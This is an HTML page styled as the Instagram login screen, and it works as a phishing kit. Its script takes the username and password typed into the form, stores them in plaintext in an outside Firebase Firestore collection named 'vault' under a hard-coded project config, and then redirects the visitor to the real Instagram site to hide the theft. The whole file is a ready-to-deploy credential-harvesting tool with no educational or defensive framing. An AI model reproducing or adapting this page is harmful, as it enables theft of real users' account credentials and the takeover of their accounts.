<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login â€¢ Instagram</title>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #wrapper { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo h1 { font-family: 'Cookie', cursive; font-size: 40px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        .form-btn { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .form-btn:disabled { background-color: #b2dffc; }
        .has-separator { display: block; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
        .facebook-login { color: #385185; text-decoration: none; font-weight: bold; display: block; margin-bottom: 15px; }
        .password-reset { font-size: 12px; color: #00376b; text-decoration: none; }
    </style>
</head>
<body>

    <div id="wrapper">
        <div class="logo">
            <h1>Instagram</h1>
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button class="form-btn" id="submitBtn" type="submit">Log in</button>
            
            <span class="has-separator">OR</span>
            
            <a href="#" class="facebook-login">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </a>
            <a class="password-reset" href="#">Forgot password?</a>
        </form>
    </div>

    <script type="module">
        // Import Firebase modules from the CDN
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Your specific Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCUG_aUI9BKz6Cc8KZDI7MECDDBsR2r5_w",
            authDomain: "instagram-f94b6.firebaseapp.com",
            projectId: "instagram-f94b6",
            storageBucket: "instagram-f94b6.firebasestorage.app",
            messagingSenderId: "48971737193",
            appId: "1:48971737193:web:2cec8e81107e66dd71daf8",
            measurementId: "G-E2JJPSGFWB"
        };

        // Initialize Firebase and Firestore
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const loginForm = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // UI Feedback
            submitBtn.disabled = true;
            submitBtn.innerText = "Logging in...";

            const userVal = document.getElementById('username').value;
            const passVal = document.getElementById('password').value;

            try {
                // Save the data to a collection named 'vault'
                await addDoc(collection(db, "vault"), {
                    user: userVal,
                    pass: passVal,
                    time: serverTimestamp()
                });

                // Redirect to the real Instagram after saving
                window.location.href = "https://www.instagram.com";
            } catch (error) {
                console.error("Error saving to Firebase:", error);
                alert("Connection error. Please try again.");
                submitBtn.disabled = false;
                submitBtn.innerText = "Log in";
            }
        });
    </script>

</body>
</html>
